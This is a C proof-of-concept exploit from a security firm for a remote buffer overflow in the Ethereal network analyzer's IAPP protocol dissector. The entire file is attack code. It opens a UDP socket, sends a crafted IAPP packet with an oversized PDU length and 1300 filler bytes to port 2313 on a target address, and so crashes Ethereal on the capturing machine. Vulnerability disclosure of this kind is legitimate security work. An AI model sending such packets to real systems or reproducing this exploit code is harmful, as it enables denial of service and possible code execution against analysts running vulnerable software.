/*
 * 
 * Ethereal IAPP remote buffer overflow #2 PoC exploit 
 * ---------------------------------------------------
 * To test this vulnerability on windows, try to send 3-10 packets 
 * that will trigger the crash, and scroll between captured packets
 * in Ethereal.
 * 
 * Coded by Leon Juranic <ljuranic@lss.hr> 
 * LSS Security <http://security.lss.hr/en/>
 * 
 */ 

#include <stdio.h>
#include <windows.h>

#pragma comment (lib,"ws2_32")

#define IAPP_PDU_SSID 0

typedef struct _e_iapphdr {
        unsigned char ia_version;
        unsigned char ia_type;
} e_iapphdr;


typedef struct _e_pduhdr {
	unsigned char pdu_type;
	unsigned char pdu_len_h;
	unsigned char pdu_len_l;
} e_pduhdr;


void xp_sendpacket (char *pack)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	int sock,i;
	struct sockaddr_in sin;
	unsigned char buf[2000];
	char bla[2000];
	e_iapphdr *iapp;
	e_pduhdr *pdu;

	wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		printf ("error!!!\n");
		ExitProcess(-1);
	}

	sock=socket(AF_INET,SOCK_DGRAM,0);

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = inet_addr(pack);
	sin.sin_port = htons(2313);

	iapp = (e_iapphdr*)&buf;
	iapp->ia_version = 1;
	iapp->ia_type = 1;
	
	pdu  = (e_pduhdr*)(buf+2);
	pdu->pdu_type = 3; 
	pdu->pdu_len_h = 0x05;    
	pdu->pdu_len_l = 0xa1;
	
	memset (bla,'\xfc',1300); 
	strncpy ((char*)&buf+sizeof(e_iapphdr)+sizeof(e_pduhdr),bla,2000);
	
//	for (i=0;i<1000;i++)
	sendto (sock,(char*)buf,1489,0,(struct sockaddr*)&sin,sizeof(struct sockaddr));

}


main (int argc, char **argv)
{
	
	xp_sendpacket(argv[1]);
}
